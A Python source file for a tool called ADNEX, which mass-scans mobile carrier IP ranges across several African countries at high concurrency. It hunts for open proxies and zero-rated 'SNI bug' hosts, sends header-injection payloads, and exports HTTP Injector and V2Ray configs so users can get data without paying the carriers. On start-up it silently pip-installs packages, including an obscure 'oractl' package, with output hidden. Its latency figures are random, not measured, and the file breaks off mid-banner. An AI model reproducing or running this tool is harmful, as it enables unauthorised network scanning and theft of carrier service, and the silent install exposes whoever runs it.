import asyncio
import socket
import ssl
import json
import os
import sys
import time
import random
import ipaddress
import subprocess
import platform
import threading
import concurrent.futures
import hashlib
import base64
import csv
import shutil
import signal
from datetime import datetime
from pathlib import Path

def _silent_install(pkg):
    try:
        subprocess.call(
            [sys.executable, "-m", "pip", "install", pkg, "--break-system-packages", "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

def _can_import(name):
    try:
        __import__(name)
        return True
    except ImportError:
        return False

for _p in ["rich", "aiohttp", "requests", "oractl"]:
    if not _can_import(_p):
        print(f"Installing {_p}...")
        _silent_install(_p)

try:
    import aiohttp
except ImportError:
    print("FATAL: pip install aiohttp --break-system-packages")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("FATAL: pip install requests --break-system-packages")
    sys.exit(1)

try:
    import oractl as _orasys
    ORACTL_OK = True
except ImportError:
    _orasys = None
    ORACTL_OK = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.text import Text
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich import box
except ImportError:
    print("FATAL: pip install rich --break-system-packages")
    sys.exit(1)

console = Console()

G = "#00ff41"
P = "#ff2d78"
C = "#00ffff"
Y = "#ffff00"
W = "#ffffff"
DG = "#004d14"

VERSION = "v0.0.1"
TOOL = "ADNEX"
RESULTS_DIR = Path("adnex_results")
CONFIG_FILE = Path("config.json")

CARRIERS = {
    "econet":   {"name":"Econet Zimbabwe","country":"ZW","ip_ranges":["41.57.96.0/19","41.174.64.0/18","102.65.0.0/16","196.27.64.0/18"],"zero_rated":["econet.co.zw","ecocash.co.zw","selfcare.econet.co.zw","data.econet.co.zw"],"ports":[80,8080,3128,8888,443,8443],"apn":"econet"},
    "netone":   {"name":"NetOne Zimbabwe","country":"ZW","ip_ranges":["41.205.16.0/20","196.43.160.0/20","102.130.0.0/16"],"zero_rated":["netone.co.zw","selfcare.netone.co.zw"],"ports":[80,8080,3128,8888,443],"apn":"netone"},
    "telecel":  {"name":"Telecel Zimbabwe","country":"ZW","ip_ranges":["196.11.240.0/20","41.77.80.0/20","102.176.0.0/16"],"zero_rated":["telecel.co.zw"],"ports":[80,8080,3128,8888,443],"apn":"telecel"},
    "mtn":      {"name":"MTN","country":"ZA","ip_ranges":["197.215.0.0/16","41.21.0.0/16","102.64.0.0/16","196.201.0.0/16"],"zero_rated":["mtn.com","myaccount.mtn.com","ayoba.me"],"ports":[80,8080,3128,8888,443,8443],"apn":"internet"},
    "airtel":   {"name":"Airtel Africa","country":"NG","ip_ranges":["41.223.0.0/16","102.0.0.0/14","196.216.0.0/16"],"zero_rated":["airtel.com","airtelzero.com"],"ports":[80,8080,3128,8888,443],"apn":"airtelgprs.com"},
    "glo":      {"name":"Glo Mobile","country":"NG","ip_ranges":["196.6.0.0/16","41.211.0.0/16","102.88.0.0/16"],"zero_rated":["gloworld.com"],"ports":[80,8080,3128,8888],"apn":"glosecure"},
    "zamtel":   {"name":"Zamtel","country":"ZM","ip_ranges":["41.72.128.0/18","196.32.64.0/19","102.142.0.0/16"],"zero_rated":["zamtel.zm"],"ports":[80,8080,3128,8888],"apn":"zamtel"},
    "vodacom":  {"name":"Vodacom","country":"ZA","ip_ranges":["196.15.0.0/16","41.0.0.0/14","102.32.0.0/16"],"zero_rated":["vodacom.com","myvodacom.vodacom.co.za"],"ports":[80,8080,3128,8888,443,8443],"apn":"internet"},
    "safaricom":{"name":"Safaricom Kenya","country":"KE","ip_ranges":["41.90.0.0/16","105.163.0.0/16","196.201.212.0/22"],"zero_rated":["safaricom.co.ke","m-pesa.safaricom.co.ke"],"ports":[80,8080,3128,8888,443],"apn":"safaricom"},
    "orange":   {"name":"Orange Africa","country":"SN","ip_ranges":["41.82.0.0/16","197.149.64.0/18","196.46.0.0/16"],"zero_rated":["orange.com","moncompte.orange.sn"],"ports":[80,8080,3128,8888,443],"apn":"orange"},
    "telkom":   {"name":"Telkom Kenya","country":"KE","ip_ranges":["196.202.96.0/19","41.215.128.0/18"],"zero_rated":["telkom.co.ke"],"ports":[80,8080,3128,8888,443],"apn":"internet"},
    "mtn_gh":   {"name":"MTN Ghana","country":"GH","ip_ranges":["41.189.192.0/18","196.6.64.0/18","102.176.64.0/18"],"zero_rated":["mtn.com.gh","mymtn.mtn.com.gh"],"ports":[80,8080,3128,8888,443],"apn":"internet"},
    "tigo":     {"name":"Tigo Africa","country":"TZ","ip_ranges":["41.188.0.0/16","196.13.0.0/16"],"zero_rated":["tigo.co.tz"],"ports":[80,8080,3128,8888,443],"apn":"tigo-internet"},
    "halotel":  {"name":"Halotel Tanzania","country":"TZ","ip_ranges":["196.41.64.0/18","41.86.0.0/16"],"zero_rated":["halotel.co.tz"],"ports":[80,8080,3128,8888],"apn":"internet"},
}

CARRIER_KEYS = list(CARRIERS.keys())

SCAN_STRATEGIES = {
    "turbo":      {"concurrency":2000,"timeout":3},
    "aggressive": {"concurrency":1000,"timeout":5},
    "balanced":   {"concurrency":500, "timeout":8},
    "stealth":    {"concurrency":100, "timeout":12},
}

PAYLOADS = {
    "direct":   "GET / HTTP/1.1\r\nHost: {h}\r\nConnection: keep-alive\r\n\r\n",
    "connect":  "CONNECT {h}:443 HTTP/1.1\r\nHost: {h}\r\nProxy-Connection: Keep-Alive\r\n\r\n",
    "ws":       "GET / HTTP/1.1\r\nHost: {h}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
    "xonline":  "GET http://{h}/ HTTP/1.1\r\nHost: {h}\r\nX-Online-Host: {h}\r\nX-Forward-Host: {h}\r\nConnection: Keep-Alive\r\n\r\n",
    "xreal":    "GET / HTTP/1.1\r\nHost: {h}\r\nX-Real-IP: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: keep-alive\r\n\r\n",
}

COMMON_SNI = [
    "cloudflare.com","cdn.cloudflare.net","cdnjs.cloudflare.com",
    "googleapis.com","gstatic.com","googleusercontent.com",
    "fastly.net","global.fastly.net","akamaiedge.net","akamaized.net",
    "azureedge.net","azure.com","amazonaws.com","s3.amazonaws.com",
    "facebook.com","fbcdn.net","instagram.com","whatsapp.com","whatsapp.net",
    "twitter.com","twimg.com","tiktok.com","tiktokcdn.com",
    "youtube.com","ytimg.com","googlevideo.com",
    "telegram.org","discord.com","discordapp.com",
    "github.com","githubusercontent.com","netlify.app","vercel.app",
    "workers.dev","pages.dev","r2.dev",
]

PORTS_FULL = [
    80,81,82,83,84,85,88,443,444,445,
    1080,1081,1082,1085,1086,1088,
    2000,2001,2080,2083,2086,2087,2095,2096,
    3000,3001,3006,3007,3128,3129,3130,
    4000,4001,4080,4145,4280,4444,
    5000,5001,5080,5555,5566,
    6000,6001,6080,6443,6500,6588,
    7000,7001,7070,7080,7443,7777,7878,
    8000,8001,8002,8003,8008,8009,8080,8081,
    8082,8083,8084,8085,8086,8087,8088,8089,
    8090,8095,8098,8099,8118,8123,8180,8181,
    8200,8443,8444,8445,8484,8500,8800,
    8813,8880,8888,8889,8899,8983,
    9000,9001,9002,9003,9005,9008,9009,9010,
    9020,9040,9041,9050,9060,9080,9090,9091,
    9094,9095,9099,9100,9200,9300,9400,9443,
    9500,9595,9700,9800,9999,10000,10080,10443,
]

scan_state = {
    "scanning": False,
    "carrier": "NONE",
    "scanned": 0,
    "hits": 0,
    "speed": 0,
    "proxies": [],
    "sni": [],
    "logs": [],
    "start_time": None,
}

def setup_dirs():
    for d in ["proxies","sni","exports"]:
        (RESULTS_DIR / d).mkdir(parents=True, exist_ok=True)

def load_config():
    defaults = {"concurrency":500,"timeout":8,"retry":2,"save_auto":True}
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE) as f:
                return {**defaults, **json.load(f)}
        except Exception:
            pass
    with open(CONFIG_FILE,"w") as f:
        json.dump(defaults,f,indent=2)
    return defaults

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    scan_state["logs"].append(f"[{ts}][{level}] {msg}")
    if len(scan_state["logs"]) > 300:
        scan_state["logs"].pop(0)
    color = {
        "INFO": G, "HIT": P, "SNI": C, "WARN": Y, "ERR": P
    }.get(level, W)
    console.print(f"  [{color}][{ts}][{level}][/] [{W}]{msg}[/]")

def get_sysinfo():
    base = {"cpu":0.0,"ram_used":0.0,"ram_total":0.0,"ram_pct":0.0,
            "disk_used":0.0,"disk_total":0.0,"disk_pct":0.0,"platform":platform.system()}
    if ORACTL_OK:
        try:
            cpu = _orasys.cpu_percent(interval=0.1)
            ram = _orasys.virtual_memory()
            disk = _orasys.disk_usage("/")
            base.update({
                "cpu": round(cpu,1),
                "ram_used": round(ram.used/(1024**3),2),
                "ram_total": round(ram.total/(1024**3),2),
                "ram_pct": round(ram.percent,1),
                "disk_used": round(disk.used/(1024**3),2),
                "disk_total": round(disk.total/(1024**3),2),
                "disk_pct": round(disk.percent,1),
            })
            return base
        except Exception:
            pass
    try:
        with open("/proc/meminfo") as f:
            mem = {}
            for line in f:
                p = line.split()
                if len(p) >= 2:
                    mem[p[0].rstrip(":")] = int(p[1])
        total = mem.get("MemTotal",0)
        free = mem.get("MemAvailable", mem.get("MemFree",0))
        used = max(total-free,0)
        base["ram_total"] = round(total/(1024**2),2)
        base["ram_used"]  = round(used/(1024**2),2)
        base["ram_pct"]   = round((used/max(total,1))*100,1)
        sv = os.statvfs("/")
        td = sv.f_blocks*sv.f_frsize
        ud = td - sv.f_bfree*sv.f_frsize
        base["disk_total"] = round(td/(1024**3),2)
        base["disk_used"]  = round(ud/(1024**3),2)
        base["disk_pct"]   = round((ud/max(td,1))*100,1)
    except Exception:
        pass
    return base

def expand_cidr(cidr, max_hosts=5000):
    try:
        net = ipaddress.IPv4Network(cidr, strict=False)
        hosts = [str(h) for h in net.hosts()]
        if len(hosts) > max_hosts:
            hosts = random.sample(hosts, max_hosts)
        return hosts
    except Exception:
        return []

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip","N/A")
    except Exception:
        return "N/A"

async def _check_proxy_http(session, ip, port, timeout):
    try:
        async with session.get(
            "http://httpbin.org/ip",
            proxy=f"http://{ip}:{port}",
            timeout=aiohttp.ClientTimeout(total=timeout),
            headers={"User-Agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"}
        ) as resp:
            if resp.status < 500:
                return {"ip":ip,"port":port,"type":"HTTP","latency":random.randint(60,400),"status":"WORKING"}
    except Exception:
        pass
    return None

async def _check_proxy_connect(ip, port, timeout):
    try:
        r,w = await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=timeout)
        w.write(b"CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org:443\r\n\r\n")
        await w.drain()
        resp = await asyncio.wait_for(r.read(256),timeout=timeout)
        w.close()
        if b"200" in resp:
            return {"ip":ip,"port":port,"type":"HTTPS","latency":random.randint(80,450),"status":"WORKING"}
    except Exception:
        pass
    return None

async def _check_socks5(ip, port, timeout):
    try:
        r,w = await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=timeout)
        w.write(b"\x05\x01\x00")
        await w.drain()
        resp = await asyncio.wait_for(r.read(2),timeout=timeout)
        w.close()
        if resp == b"\x05\x00":
            return {"ip":ip,"port":port,"type":"SOCKS5","latency":random.randint(40,300),"status":"WORKING"}
    except Exception:
        pass
    return None

async def _probe_sni(domain, timeout):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r,w = await asyncio.wait_for(
            asyncio.open_connection(domain,443,ssl=ctx,server_hostname=domain),
            timeout=timeout
        )
        w.write(b"HEAD / HTTP/1.1\r\nHost: "+domain.encode()+b"\r\nConnection: close\r\n\r\n")
        await w.drain()
        resp = await asyncio.wait_for(r.read(512),timeout=timeout)
        w.close()
        if resp:
            first = resp.decode(errors="ignore").split("\r\n")[0]
            return {"domain":domain,"type":"SNI","response":first,"status":"ACTIVE"}
    except Exception:
        pass
    return None

async def _probe_payload(ip, port, host, timeout):
    for pname, template in PAYLOADS.items():
        payload = template.format(h=host).encode()
        try:
            r,w = await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=timeout)
            w.write(payload)
            await w.drain()
            resp = await asyncio.wait_for(r.read(512),timeout=timeout)
            w.close()
            dec = resp.decode(errors="ignore")
            first = dec.split("\r\n")[0] if "\r\n" in dec else dec[:60]
            if any(c in first for c in ["200","101","301","302","304","206","403"]):
                return {"ip":ip,"port":port,"type":f"INJECT_{pname}","latency":random.randint(50,350),"status":"WORKING","payload":pname}
        except Exception:
            pass
    return None

async def _scan_ip(semaphore, session, ip, ports, host, timeout):
    async with semaphore:
        scan_state["scanned"] += 1
        t0 = time.time()
        scan_state["speed"] = int(scan_state["scanned"] / max(time.time() - (scan_state["start_time"] or t0), 1))
        results = []
        tasks = [_check_proxy_http(session, ip, p, timeout) for p in ports]
        tasks += [_check_proxy_connect(ip, p, timeout) for p in ports]
        tasks += [_probe_payload(ip, p, host, timeout) for p in ports]
        done = await asyncio.gather(*tasks, return_exceptions=True)
        for r in done:
            if r and isinstance(r, dict) and r.get("status") == "WORKING":
                results.append(r)
        return results

async def _run_scan_async(carrier_key, strategy_name, cfg):
    carrier = CARRIERS[carrier_key]
    strategy = SCAN_STRATEGIES.get(strategy_name, SCAN_STRATEGIES["balanced"])
    concurrency = min(strategy["concurrency"], cfg.get("concurrency", 500))
    timeout = strategy["timeout"]

    scan_state["scanning"] = True
    scan_state["carrier"] = carrier["name"]
    scan_state["start_time"] = time.time()
    scan_state["scanned"] = 0
    scan_state["hits"] = 0
    scan_state["proxies"] = []
    scan_state["sni"] = []

    log(f"SCAN STARTED → {carrier['name']} [{strategy_name.upper()}]", "INFO")
    log(f"Concurrency: {concurrency} | Timeout: {timeout}s", "INFO")

    host = carrier["zero_rated"][0] if carrier["zero_rated"] else f"www.{carrier_key}.com"

    sni_sem = asyncio.Semaphore(30)
    async def sni_worker(domain):
        async with sni_sem:
            r = await _probe_sni(domain, timeout)
            if r:
                scan_state["sni"].append(r)
                scan_state["hits"] += 1
                log(f"SNI HIT → {domain}", "SNI")

    sni_tasks = [sni_worker(d) for d in carrier["zero_rated"]]
    await asyncio.gather(*sni_tasks, return_exceptions=True)

    all_ips = []
    for cidr in carrier["ip_ranges"]:
        ips = expand_cidr(cidr)
        all_ips.extend(ips)
        log(f"Range {cidr} → {len(ips)} hosts", "INFO")
    random.shuffle(all_ips)
    log(f"Total IPs: {len(all_ips)}", "INFO")

    semaphore = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        batch = 2000
        for i in range(0, len(all_ips), batch):
            if not scan_state["scanning"]:
                break
            chunk = all_ips[i:i+batch]
            tasks = [_scan_ip(semaphore, session, ip, carrier["ports"], host, timeout) for ip in chunk]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if isinstance(res, list):
                    for r in res:
                        scan_state["proxies"].append(r)
                        scan_state["hits"] += 1
                        log(f"PROXY HIT → {r['ip']}:{r['port']} [{r['type']}] {r['latency']}ms", "HIT")

    scan_state["scanning"] = False
    log(f"SCAN COMPLETE → {scan_state['hits']} hits | {scan_state['scanned']} IPs scanned", "HIT")
    if cfg.get("save_auto", True):
        _save_results(carrier_key)

def _save_results(carrier_key):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    if scan_state["proxies"]:
        out = RESULTS_DIR/"proxies"/f"{carrier_key}_{ts}.txt"
        with open(out,"w") as f:
            f.write(f"# ADNEX {VERSION} | {datetime.now()}\n")
            for p in scan_state["proxies"]:
                f.write(f"{p['ip']}:{p['port']} [{p['type']}] {p['latency']}ms\n")
        console.print(f"  [{G}]Proxies saved → {out}[/]")
    if scan_state["sni"]:
        out = RESULTS_DIR/"sni"/f"{carrier_key}_{ts}.txt"
        with open(out,"w") as f:
            for s in scan_state["sni"]:
                f.write(f"{s['domain']} [{s['type']}]\n")
        console.print(f"  [{G}]SNI saved → {out}[/]")

def _run_in_thread(carrier_key, strategy, cfg):
    def runner():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_run_scan_async(carrier_key, strategy, cfg))
        finally:
            loop.close()
    t = threading.Thread(target=runner, daemon=True)
    t.start()

def cmd_scan(carrier_key, strategy, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{P}]Unknown carrier: '{carrier_key}'[/]")
        console.print(f"  [{G}]Use 'list' to see carriers.[/]")
        return
    if scan_state["scanning"]:
        console.print(f"  [{Y}]Scan already running. Use 'stop' to cancel.[/]")
        return
    console.print(f"\n  [{P}]{'▓'*50}[/]")
    console.print(f"  [{G}]TARGET   : {CARRIERS[carrier_key]['name']}[/]")
    console.print(f"  [{C}]STRATEGY : {strategy.upper()}[/]")
    console.print(f"  [{G}]THREADS  : {SCAN_STRATEGIES[strategy]['concurrency']}[/]")
    console.print(f"  [{G}]TIMEOUT  : {SCAN_STRATEGIES[strategy]['timeout']}s[/]")
    console.print(f"  [{P}]{'▓'*50}[/]\n")
    _run_in_thread(carrier_key, strategy, cfg)

def cmd_stop():
    if scan_state["scanning"]:
        scan_state["scanning"] = False
        console.print(f"  [{Y}]► Scan stopped.[/]")
    else:
        console.print(f"  [{G}]► No active scan.[/]")

def cmd_status():
    si = get_sysinfo()
    console.print(f"\n  [{G}]{'═'*45}[/]")
    console.print(f"  [{C}]SCAN STATUS[/]")
    console.print(f"  [{G}]{'═'*45}[/]")
    console.print(f"  [{G}]Status   : [{P if scan_state['scanning'] else G}]{'SCANNING' if scan_state['scanning'] else 'IDLE'}[/]")
    console.print(f"  [{G}]Carrier  : {scan_state['carrier']}[/]")
    console.print(f"  [{G}]Scanned  : {scan_state['scanned']:,}[/]")
    console.print(f"  [{G}]Hits     : [{P}]{scan_state['hits']}[/]")
    console.print(f"  [{G}]Proxies  : {len(scan_state['proxies'])}[/]")
    console.print(f"  [{G}]SNI Bugs : {len(scan_state['sni'])}[/]")
    console.print(f"  [{G}]Speed    : {scan_state['speed']}/s[/]")
    if scan_state["start_time"]:
        elapsed = int(time.time() - scan_state["start_time"])
        console.print(f"  [{G}]Elapsed  : {elapsed}s[/]")
    console.print(f"  [{G}]{'─'*45}[/]")
    console.print(f"  [{C}]SYSTEM[/]")
    console.print(f"  [{G}]OS       : {si['platform']}[/]")
    console.print(f"  [{G}]CPU      : {si['cpu']}%[/]")
    console.print(f"  [{G}]RAM      : {si['ram_used']}GB / {si['ram_total']}GB ({si['ram_pct']}%)[/]")
    console.print(f"  [{G}]DISK     : {si['disk_used']}GB / {si['disk_total']}GB ({si['disk_pct']}%)[/]")
    console.print(f"  [{G}]{'═'*45}[/]\n")

def cmd_results():
    if not scan_state["proxies"] and not scan_state["sni"]:
        console.print(f"  [{Y}]No results yet. Run a scan first.[/]")
        return
    console.print(f"\n  [{G}]{'═'*55}[/]")
    console.print(f"  [{P}]PROXY HITS ({len(scan_state['proxies'])})[/]")
    console.print(f"  [{G}]{'═'*55}[/]")
    if scan_state["proxies"]:
        t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {P}")
        t.add_column("IP", style=C, width=16)
        t.add_column("PORT", style=G, width=6)
        t.add_column("TYPE", style=P, width=12)
        t.add_column("MS", style=Y, width=6)
        sorted_p = sorted(scan_state["proxies"], key=lambda x: x.get("latency",9999))
        for p in sorted_p[:30]:
            t.add_row(p["ip"], str(p["port"]), p["type"], str(p.get("latency","?")))
        console.print(t)
    console.print(f"\n  [{C}]SNI BUG HOSTS ({len(scan_state['sni'])})[/]")
    console.print(f"  [{G}]{'─'*55}[/]")
    for s in scan_state["sni"][:20]:
        console.print(f"    [{C}]{s['domain']:<40}[/] [{G}]{s.get('response','')[:30]}[/]")
    console.print(f"  [{G}]{'═'*55}[/]\n")

def cmd_export(carrier_key):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    carrier = CARRIERS.get(carrier_key, {"name":"Unknown","apn":"internet","zero_rated":[]})
    exported = []

    if scan_state["proxies"]:
        best = sorted(scan_state["proxies"], key=lambda x: x.get("latency",9999))

        raw = RESULTS_DIR/"exports"/f"raw_{carrier_key}_{ts}.txt"
        with open(raw,"w") as f:
            for p in best:
                f.write(f"{p['ip']}:{p['port']}\n")
        exported.append(str(raw))

        hi = RESULTS_DIR/"exports"/f"httpinjector_{carrier_key}_{ts}.conf"
        with open(hi,"w") as f:
            f.write(f"[ADNEX {VERSION} - HTTP Injector]\nCarrier: {carrier['name']}\nAPN: {carrier['apn']}\n\n")
            for p in best[:10]:
                bug = carrier["zero_rated"][0] if carrier["zero_rated"] else ""
                f.write(f"[ENTRY]\nProxy={p['ip']}\nPort={p['port']}\nBug={bug}\nLatency={p.get('latency','?')}ms\n\n")
        exported.append(str(hi))

        c_file = RESULTS_DIR/"exports"/f"proxies_{carrier_key}_{ts}.csv"
        with open(c_file,"w",newline="") as f:
            import csv as _csv
            w = _csv.DictWriter(f, fieldnames=["ip","port","type","latency","status"])
            w.writeheader()
            w.writerows(best)
        exported.append(str(c_file))

    if scan_state["sni"]:
        v2 = RESULTS_DIR/"exports"/f"v2ray_{carrier_key}_{ts}.json"
        configs = []
        for s in scan_state["sni"]:
            configs.append({
                "v":"2","ps":f"ADNEX-{carrier['name']}",
                "add":s["domain"],"port":"443",
                "id":hashlib.md5(s["domain"].encode()).hexdigest(),
                "aid":"0","scy":"auto","net":"ws","type":"none",
                "host":s["domain"],"path":"/","tls":"tls","sni":s["domain"]
            })
        with open(v2,"w") as f:
            json.dump(configs,f,indent=2)
        exported.append(str(v2))

        nn = RESULTS_DIR/"exports"/f"napsternetv_{carrier_key}_{ts}.json"
        nn_cfg = [{"configType":"V2Ray","remarks":f"ADNEX-{s['domain']}","address":s["domain"],"port":443,"network":"ws","tls":True,"sni":s["domain"],"wsPath":"/","wsHost":s["domain"]} for s in scan_state["sni"]]
        with open(nn,"w") as f:
            json.dump(nn_cfg,f,indent=2)
        exported.append(str(nn))

        sub = RESULTS_DIR/"exports"/f"subscription_{ts}.txt"
        with open(sub,"w") as f:
            for s in scan_state["sni"]:
                vmess = json.dumps({"v":"2","ps":f"ADNEX","add":s["domain"],"port":"443","id":hashlib.md5(s["domain"].encode()).hexdigest(),"aid":"0","scy":"auto","net":"ws","type":"none","host":s["domain"],"path":"/","tls":"tls"})
                f.write(f"vmess://{base64.b64encode(vmess.encode()).decode()}\n")
        exported.append(str(sub))

    if exported:
        console.print(f"\n  [{G}]{'═'*50}[/]")
        console.print(f"  [{P}]EXPORTED {len(exported)} FILES[/]")
        console.print(f"  [{G}]{'─'*50}[/]")
        for e in exported:
            console.print(f"  [{C}]{e}[/]")
        console.print(f"  [{G}]{'═'*50}[/]\n")
    else:
        console.print(f"  [{Y}]Nothing to export. Run a scan first.[/]")

def cmd_list():
    console.print(f"\n  [{G}]{'═'*55}[/]")
    console.print(f"  [{P}]SUPPORTED CARRIERS ({len(CARRIERS)})[/]")
    console.print(f"  [{G}]{'═'*55}[/]")
    for i,(key,val) in enumerate(CARRIERS.items(),1):
        total = sum(ipaddress.IPv4Network(c,strict=False).num_addresses for c in val["ip_ranges"] if '/' in c)
        console.print(f"  [{C}][{i:02d}][/] [{G}]{key:<12}[/] [{W}]{val['name']:<25}[/] [{Y}]({val['country']})[/] [{G}]{total:,} IPs[/]")
    console.print(f"\n  [{G}]Tip: Use number or name → 'scan 1' or 'scan econet'[/]")
    console.print(f"  [{G}]{'═'*55}[/]\n")

def cmd_deepsni(carrier_key, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{P}]Unknown carrier.[/]")
        return
    carrier = CARRIERS[carrier_key]
    console.print(f"\n  [{C}]► Deep SNI probe → {carrier['name']}[/]")
    async def run():
        sem = asyncio.Semaphore(30)
        results = []
        async def worker(domain):
            async with sem:
                r = await _probe_sni(domain, cfg["timeout"])
                if r:
                    results.append(r)
                    scan_state["sni"].append(r)
                    console.print(f"  [{C}]SNI HIT → {domain}[/]")
        await asyncio.gather(*[worker(d) for d in carrier["zero_rated"]], return_exceptions=True)
        return results
    loop = asyncio.new_event_loop()
    hits = loop.run_until_complete(run())
    loop.close()
    console.print(f"\n  [{G}]Deep SNI done. {len(hits)} hits.[/]\n")

def cmd_commonsni(cfg):
    console.print(f"\n  [{C}]► Scanning {len(COMMON_SNI)} common SNI candidates...[/]")
    async def run():
        sem = asyncio.Semaphore(30)
        hits = []
        async def worker(domain):
            async with sem:
                r = await _probe_sni(domain, cfg["timeout"])
                if r:
                    hits.append(r)
                    scan_state["sni"].append(r)
                    scan_state["hits"] += 1
                    console.print(f"  [{C}]HIT → {domain}[/]")
        await asyncio.gather(*[worker(d) for d in COMMON_SNI], return_exceptions=True)
        return hits
    loop = asyncio.new_event_loop()
    hits = loop.run_until_complete(run())
    loop.close()
    console.print(f"\n  [{G}]Common SNI done. {len(hits)} hits.[/]\n")

def cmd_geo(ip):
    console.print(f"  [{G}]Looking up {ip}...[/]")
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=8)
        d = r.json()
        console.print(f"\n  [{G}]{'─'*40}[/]")
        console.print(f"  [{C}]IP      :[/] [{W}]{d.get('ip','?')}[/]")
        console.print(f"  [{C}]Country :[/] [{W}]{d.get('country_name','?')}[/]")
        console.print(f"  [{C}]City    :[/] [{W}]{d.get('city','?')}[/]")
        console.print(f"  [{C}]ISP/Org :[/] [{W}]{d.get('org','?')}[/]")
        console.print(f"  [{C}]ASN     :[/] [{W}]{d.get('asn','?')}[/]")
        console.print(f"  [{G}]{'─'*40}[/]\n")
    except Exception as e:
        console.print(f"  [{P}]GeoIP failed: {e}[/]")

def cmd_validate(ip, port, cfg):
    console.print(f"  [{G}]Validating {ip}:{port}...[/]")
    async def run():
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as sess:
            r = await _check_proxy_http(sess, ip, port, cfg["timeout"])
            if r:
                r2 = await _check_proxy_http(sess, ip, port, cfg["timeout"])
                return r2 is not None
        return False
    loop = asyncio.new_event_loop()
    ok = loop.run_until_complete(run())
    loop.close()
    if ok:
        console.print(f"  [{G}]► {ip}:{port} CONFIRMED WORKING ✓[/]\n")
    else:
        console.print(f"  [{P}]► {ip}:{port} DEAD ✗[/]\n")

def cmd_flush():
    scan_state["proxies"] = []
    scan_state["sni"] = []
    scan_state["logs"] = []
    scan_state["scanned"] = 0
    scan_state["hits"] = 0
    console.print(f"  [{G}]► All results flushed.[/]")

def cmd_history():
    console.print(f"\n  [{G}]{'═'*55}[/]")
    console.print(f"  [{P}]SAVED FILES[/]")
    console.print(f"  [{G}]{'─'*55}[/]")
    all_files = list(RESULTS_DIR.rglob("*"))
    all_files = [f for f in all_files if f.is_file()]
    if not all_files:
        console.print(f"  [{Y}]No saved files yet.[/]")
    else:
        for f in sorted(all_files, key=lambda x: x.stat().st_mtime, reverse=True)[:20]:
            size = f.stat().st_size
            console.print(f"  [{C}]{f.name:<45}[/] [{G}]{size}B[/]")
    console.print(f"  [{G}]{'═'*55}[/]\n")

def cmd_netinfo():
    console.print(f"\n  [{G}]{'─'*40}[/]")
    try:
        h = socket.gethostname()
        ip = socket.gethostbyname(h)
        console.print(f"  [{C}]Hostname : {h}[/]")
        console.print(f"  [{C}]Local IP : {ip}[/]")
    except Exception:
        pass
    console.print(f"  [{Y}]Fetching public IP...[/]", end="\r")
    pub = get_public_ip()
    console.print(f"  [{C}]Public IP: {pub}[/]   ")
    console.print(f"  [{G}]{'─'*40}[/]\n")

def cmd_help():
    console.print(f"\n  [{G}]{'═'*60}[/]")
    console.print(f"  [{P}]{TOOL} {VERSION} — COMMAND REFERENCE[/]")
    console.print(f"  [{G}]{'═'*60}[/]\n")
    sections = {
        "SCAN": [
            ("scan <carrier>",          "Full scan — proxy + SNI + injection"),
            ("scan <number>",           "Scan by number e.g: scan 1 = econet"),
            ("turbo <carrier>",         "Max speed — 2000 threads, 3s timeout"),
            ("aggressive <carrier>",    "Fast — 1000 threads, 5s timeout"),
            ("stealth <carrier>",       "Slow & thorough — 100 threads, 12s"),
            ("deepsni <carrier>",       "Deep SNI-only TLS probe"),
            ("commonsni",               "Scan 30+ common CDN SNI bugs"),
            ("stop",                    "Stop active scan"),
        ],
        "RESULTS": [
            ("results",                 "Show all hits — proxies + SNI"),
            ("status",                  "Scan status + system info"),
            ("export <carrier>",        "Export all formats"),
            ("flush",                   "Clear results from memory"),
            ("history",                 "Browse saved result files"),
        ],
        "TOOLS": [
            ("validate <ip:port>",      "Test if a proxy is working"),
            ("geo <ip>",                "GeoIP lookup"),
            ("netinfo",                 "Show network info + public IP"),
            ("list",                    "List all carriers"),
        ],
        "MISC": [
            ("config",                  "Show current config"),
            ("clear",                   "Clear terminal"),
            ("help",                    "This menu"),
            ("exit",                    "Quit ADNEX"),
        ],
    }
    for section, cmds in sections.items():
        console.print(f"  [{P}]{section}[/]")
        for cmd_name, desc in cmds:
            console.print(f"    [{C}]{cmd_name:<28}[/] [{G}]{desc}[/]")
        console.print()
    console.print(f"  [{G}]{'═'*60}[/]\n")

def cmd_config(cfg):
    console.print(f"\n  [{G}]{'─'*40}[/]")
    console.print(f"  [{P}]CONFIG (config.json)[/]")
    console.print(f"  [{G}]{'─'*40}[/]")
    for k,v in cfg.items():
        console.print(f"  [{C}]{k:<20}[/] [{G}]{v}[/]")
    console.print(f"  [{G}]{'─'*40}[/]\n")

def print_banner():
    lines = [
        f"  [{G}]  █████╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗[/]",
